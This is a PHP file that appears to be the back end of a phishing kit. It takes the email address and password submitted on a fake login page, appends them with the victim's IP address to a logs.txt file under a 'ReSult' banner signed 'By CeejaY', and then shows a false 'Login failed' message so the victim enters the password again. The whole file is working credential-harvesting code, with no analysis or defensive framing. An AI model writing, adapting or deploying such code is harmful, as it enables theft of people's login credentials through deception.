<?php

$ip = getenv("REMOTE_ADDR");
$email = trim($_POST['email']);
$password = trim($_POST['password']);

if($email != null && $password != null){
	
	$myfile = fopen("logs.txt", "a") or die("Unable to open file!");
	$txt = " \n";
	$txt .= " \n";
	$txt .= "-------------- ReSult -----------------------\n";
	$txt .= "Username : ".$email."\n";
	$txt .= "Password : ".$password."\n";
	$txt .= "|--------------- IP & Det -------------------|\n";
	$txt .= "|Client IP : ".$ip."\n";
	$txt .= "|----------- By CeejaY --------------|\n";
	fwrite($myfile, $txt);
	
	$signal = 'ok';
	$msg = 'Login failed! Please enter correct password';
	
	// $praga=rand();
	// $praga=md5($praga);
	
}
else{
	$signal = 'bad';
	$msg = 'Please fill in all the fields.';
}
$data = array(
        'signal' => $signal,
        'msg' => $msg
    );
    echo json_encode($data);

?>